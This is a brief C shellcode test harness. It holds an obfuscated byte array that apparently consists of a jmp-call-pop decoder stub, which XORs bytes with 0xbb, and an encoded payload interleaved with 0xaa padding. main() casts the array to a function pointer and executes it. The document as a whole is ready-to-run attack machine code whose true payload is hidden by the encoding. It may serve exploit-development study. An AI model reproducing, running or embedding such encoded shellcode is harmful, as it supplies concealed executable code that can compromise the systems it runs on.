#include<stdio.h>
#include<string.h>

unsigned char code[] =

"\xeb\x27\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x31\xc9\xb1\x18\x80\x36\xbb\xc0\x0e\x03\x8a\x5c\x06\x01\x88\x1f\x80\x37\xbb\xc0\x0f\x03\x47\x04\x02\xe2\xef\xeb\x05\xe8\xd4\xff\xff\xff\x32\xaa\xbd\xaa\x39\xaa\xf8\xaa\xc2\xaa\xc2\xaa\x20\xaa\xf8\xaa\xf8\xaa\xc2\xaa\xa8\xaa\xf0\xaa\xc8\xaa\xf7\xaa\xa4\xaa\x39\xaa\xf7\xaa\xac\xaa\x21\xaa\xf7\xaa\xb4\xaa\x3e\xaa\xe3\xaa\xd5\xaa\xbf\xaa";

int main(void)
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

